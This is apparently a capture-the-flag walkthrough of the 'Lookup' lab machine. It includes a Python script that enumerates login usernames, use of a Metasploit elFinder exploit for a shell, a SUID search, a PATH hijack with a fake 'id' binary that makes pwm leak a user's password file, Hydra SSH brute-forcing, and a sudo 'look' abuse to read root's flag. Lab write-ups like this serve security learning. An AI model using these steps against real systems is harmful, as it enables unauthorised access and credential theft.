>Nmap showed 2 open ports, 22 and 80<br>
>by going to 80, it came to login page at `http://lookup.thm`<br>
>doing simple creds like admin:admin shows error message that reveals that only the password was incorrect.
>making a simple python scripts to run a check if any user have a simple password like "password".

```bash
import requests
# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

          # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}") 
```

>users "admin" and "jose" came back possitive, logged in as `jose:password` to files.lookup.thm
>added the files.lookup.thm to /etc/hosts and found **elFinder 2.1.47** framework,
>found an exploit on msfconsole related to it, and logged in as www-data on the machine.
>(it was wierd that i could look into `/home/think` directory )<br>
`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null`
found executing binary "/usr/sbin/pwm"<br>
by looking at the code, it showed me this:

`[!] Running 'id' command to extract the username and user ID (UID)idr[-] Error executing id command<br>`
`uid=%*u(%[^)])[-] Error reading username from id command<br>`
`[!] ID: %s`
`/home/%s/.passwords[-] File /home/%s/.passwords not found`

the user think had ".passwords" at hes ~<br>
had to impersonate the user by creating the 'id' binary,<br>
`export PATH=/tmp:$PATH`<br>
`cd /tmp ; touch id`<br>
`echo '#!/bin/bash' > /tmp/id`<br>
`echo 'echo "uid=33(think) gid=33(think) groups=33(think)"' >> /tmp/id`<br>
`chmod +x id`

/usr/sbin/pwm    --> reveals a password list at 'think' home directory.

`hydra -l think -P passlist ssh://lookup.thm`<br>
`[22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)`

'sudo -l' reveals --> *(ALL) /usr/bin/look*<br>
[GTFObins](https://gtfobins.github.io/gtfobins/look/#sudo)
`LFILE=file_to_read` (replace file_to_read with /root/root.txt)<br>
`sudo look '' "$LFILE"` <br>
**gg**